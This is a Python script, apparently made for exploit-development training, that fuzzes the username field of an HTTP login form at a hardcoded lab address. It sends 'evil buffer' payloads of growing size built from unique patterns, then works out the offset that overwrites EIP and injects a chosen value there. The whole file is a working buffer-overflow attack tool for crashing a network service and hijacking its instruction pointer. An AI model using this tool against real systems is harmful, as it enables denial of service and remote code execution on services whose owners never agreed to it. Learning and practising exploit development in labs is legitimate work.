#!/usr/bin/python3
import socket
import time
import sys
import string
import random
import binascii
import argparse

buffer_history = ""
byte_chunks = 4	#technical term for how many bytes to incrementally add to the buffer

def randomString(stringLength=4):
    seq = string.ascii_letters + string.digits
    temp = ''.join(random.choice(seq) for i in range(stringLength))
    return temp

def init_buffer(start_size):
	global buffer_history
	while len(buffer_history) < start_size:	
		seq = randomString(4)
		temp = validate(seq)
		buffer_history += temp

def validate(seq):
	while seq in buffer_history:
		seq = randomString(4)
	return seq

def increment_buffer():
	global buffer_history
	seq = randomString(4)
	temp = validate(seq)
	buffer_history += temp	

def run(current_size, end_size, eip):
	
	eip_offset = ""
	global buffer_history

	if eip is not False:
		try:
			eip_offset = int(eip.split(",")[0])
			eip_data = eip.split(",")[1]
		except:
			print("[!] eip argument value is not properly formatted")
			print("\n   --eip 780,DDDDDDDD")
			print(" offset---^     ^-----value to inject after offset ")
			sys.exit()

	while(current_size < end_size):
		try:
			current_size = len(buffer_history)
			
			content = "username=" + buffer_history + "&password=A"
			
			buffer = "POST /login HTTP/1.1\r\n"
			buffer += "Host: 192.168.149.10\r\n"
			buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
			buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
			buffer += "Accept-Language: en-US,en;q=0.5\r\n"
			buffer += "Referer: http://192.168.149.10/login\r\n"
			buffer += "Connection: close\r\n"
			buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
			buffer += "Content-Length: "+str(len(content))+"\r\n"
			buffer += "\r\n"
			buffer += content
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect(("192.168.149.10", 80))

			#print("Current Buffer:")
			#print(buffer_history)
			print("\n[*] Sending evil buffer...Size:", current_size)

			s.send(buffer.encode())
			s.close()
			time.sleep(2)
			if current_size == eip_offset:
				buffer_history += eip_data
			else:
				x = round(byte_chunks / 4)
				for i in range(0,x):		
					increment_buffer()

		except:
			print("[-] Could not connect!")
			print(sys.exc_info())
			print("Current Buffer:")
			print(buffer_history)
			if input("[?] Find Hex Offset [y/n]? ").upper() == "Y":
				eip_hex = input("EIP Shows: ")
				eip_ascii = bytearray.fromhex(eip_hex).decode()
				offset = buffer_history.find(eip_ascii[::-1])
				if offset != -1:	
					print("[+] Offest -->",offset)
					sys.exit()
				else:
					print("[!] Pattern not found")
					sys.exit()
			else:
	 			sys.exit()
		
	print("Final Buffer:")
	print(buffer_history)

def main():
	global byte_chunks
	parser = argparse.ArgumentParser(description='''This tool will help with byte offsets \
during buffer overflow exploit creation''',
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
	group = parser.add_mutually_exclusive_group(required=False)
	parser.add_argument('--start', action='store', dest='start', type=str, required=False,
	                        help='Starting buffer size')
	parser.add_argument('--end', action='store', dest='end', type=str, required=False,
	                        help='Last buffer length to try')
	group.add_argument('--eip', action='store', dest='eip', default=False, type=str, required=False,
	                        help='EIP target data with offset.  Example: 780,BBBBCCCC')
	group.add_argument('--chunk', action='store', dest='chunk', default=4, type=int, required=False,
	                        help='Increment the buffer each iteration by <x> bytes')
	parser.add_argument('--find', action='store_true', dest='find', default=False, required=False,
	                        help='Find a given hex pattern in a buffer')
	args = parser.parse_args()

	byte_chunks = args.chunk
	
	if args.find is False:
		start_size = int(args.start)
		end_size = int(args.end)
		eip = args.eip
		init_buffer(start_size)
		print("[*] Starting at {} bytes".format(start_size))
		current_size = start_size
		run(current_size, end_size, eip)
	else:
		buffer = input("[?] Paste entire buffer here:\n")
		hex = input("[?] Paste hex pattern here: ")
		hex_ascii = bytearray.fromhex(hex).decode()
		offset = buffer.find(hex_ascii[::-1])
		if offset != -1:	
			print("[+] Offest -->",offset)
			sys.exit()
		else:
			print("[!] Pattern not found")
			sys.exit()


main()